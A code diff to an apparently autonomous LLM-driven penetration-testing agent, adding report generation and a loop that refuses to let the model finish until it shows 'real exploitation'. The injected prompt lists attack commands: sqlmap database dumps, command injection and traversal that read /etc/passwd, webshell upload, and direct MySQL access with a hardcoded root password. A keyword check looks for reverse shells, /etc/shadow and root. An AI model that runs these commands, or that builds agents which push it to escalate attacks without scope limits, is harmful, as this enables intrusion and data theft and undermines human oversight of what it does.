@@ -26,6 +26,7 @@ except (OSError, PermissionError):
 
 sys.path.insert(0, os.path.dirname(__file__))
 from llm_client import LLMClient
+from comprehensive_report import ComprehensiveReport
 
 # Import new modules
 try:
@@ -274,8 +275,9 @@ Continue until the full audit is complete.
         self.executions: List[Execution] = []
         self.conversation: List[Dict] = []
         self.iteration = 0
-        self.max_iterations = 50  # More iterations for thorough exploitation
+        self.max_iterations = max_iterations
         self.mitre_context = mitre_context
+        self.comprehensive_report = ComprehensiveReport()
         self.target = None
         self.objective = None
         
@@ -568,6 +570,39 @@ You are now autonomous. Begin your assessment. Decide your approach and execute.
                 # NEVER stop early - always push for next steps
                 done_indicators = ["complete", "finished", "concluded", "final report", "audit is complete"]
                 if any(ind in response.lower() for ind in done_indicators):
+                    # Check if we have REAL exploitation (not just credentials)
+                    has_real_exploitation = self._check_exploitation_depth()
+                    
+                    if not has_real_exploitation:
+                        # NO REAL EXPLOITATION - push harder
+                        self.conversation.append({
+                            "role": "user",
+                            "content": """❌ NOT COMPLETE - You found credentials but did NOT exploit actual vulnerabilities.
+
+REQUIRED EXPLOITATION (NOT JUST CREDENTIALS):
+
+1. **SQL Injection** → Use sqlmap with --dump to extract database contents
+   Example: sqlmap -u "http://target/page?id=1" --batch --dump
+
+2. **Command Injection** → Execute system commands via vulnerable parameters
+   Example: curl "http://target/api/exec?cmd=id;whoami;cat /etc/passwd"
+
+3. **File Upload → RCE** → Upload webshell and execute commands
+   Example: Upload shell.php, then access it to run commands
+
+4. **Database Direct Access** → Connect and dump ALL tables
+   Example: mysql -h 10.0.4.40 -u root -proot123 -e "SHOW DATABASES; USE db; SELECT * FROM users;"
+
+5. **XXE/SSRF** → Read internal files or access internal services
+   Example: Send XXE payload to read /etc/passwd
+
+6. **LFI/Directory Traversal** → Read sensitive files
+   Example: curl "http://target/page?file=../../../../etc/passwd"
+
+Provide the ACTUAL EXPLOITATION commands NOW (not just login attempts)."""
+                        })
+                        continue
+                    
                     # AI says done - but we want ALL steps including lateral movement
                     if self.iteration < self.max_iterations - 5:
                         self.conversation.append({
@@ -610,12 +645,40 @@ Continue the assessment - provide the next commands."""
             combined_feedback = "\n\n---\n\n".join(all_feedback)
             self.conversation.append({"role": "user", "content": combined_feedback})
         
+        # Generate comprehensive report
+        self.comprehensive_report.parse_executions([asdict(e) for e in self.executions])
         return self._generate_report()
+    
+    def _check_exploitation_depth(self) -> bool:
+        """Check if we have real exploitation results (not just credentials)"""
+        exploitation_keywords = [
+            'database dump', 'table:', 'select * from', 'show databases',
+            'webshell uploaded', 'command executed', 'shell.php',
+            'reverse shell', '/etc/passwd', '/etc/shadow',
+            'root@', 'uid=0', 'privilege escalation',
+            'sqlmap', '--dump', 'mysqldump', 'pg_dump'
+        ]
+        
+        for exec in self.executions:
+            output = f"{exec.content} {exec.stdout} {exec.stderr}".lower()
+            if any(keyword in output for keyword in exploitation_keywords):
+                return True
+        return False
     
     def _generate_report(self) -> Dict:
         """Generate final report with exploitation results"""
         tools_used = list(set(e.tool_used for e in self.executions))
         successful = sum(1 for e in self.executions if e.success)
+        
+        # Generate comprehensive report files
+        comprehensive_json = self.comprehensive_report.generate_json_report()
+        comprehensive_md = self.comprehensive_report.generate_markdown_report()
+        
+        # Save markdown report
+        report_file = f"{self.log_dir}/COMPREHENSIVE_REPORT_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.md"
+        with open(report_file, 'w') as f:
+            f.write(comprehensive_md)
+        self._log(f"Comprehensive report saved: {report_file}")
         
         # Extract exploitation results from conversation
         exploitation_results = {
@@ -649,6 +712,8 @@ Continue the assessment - provide the next commands."""
             "failed_executions": len(self.executions) - successful,
             "tools_used": tools_used,
             "exploitation_results": exploitation_results,
+            "comprehensive_findings": comprehensive_json,
+            "comprehensive_report_file": report_file,
             "llm_stats": self.llm.get_stats(),
             "executions": [asdict(e) for e in self.executions]
         }
